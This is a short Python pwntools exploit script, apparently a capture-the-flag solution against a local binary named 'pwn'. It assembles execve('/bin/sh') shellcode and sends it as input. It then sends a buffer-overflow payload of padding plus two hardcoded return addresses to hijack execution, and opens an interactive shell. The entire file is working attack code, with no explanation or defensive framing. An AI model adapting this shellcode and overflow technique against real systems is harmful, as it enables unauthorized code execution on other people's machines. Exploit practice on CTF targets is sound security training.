from pwn import*
context(os='linux', arch='amd64', log_level='debug')
r = process('./pwn')
shellcode = asm(
'''
xor 	rsi,	rsi			
push	rsi				
mov 	rdi,	0x68732f2f6e69622f	 
push	rdi
push	rsp		
pop	rdi				
mov 	al,	59			
cdq					
syscall
'''
)

r.recvuntil("what's your name?")
r.sendline(shellcode)
r.recvuntil("what do you want?")
payload = 'a'*0x30 + p64(0x0400737) + p64(0x06010A0)
r.send(payload)
r.interactive()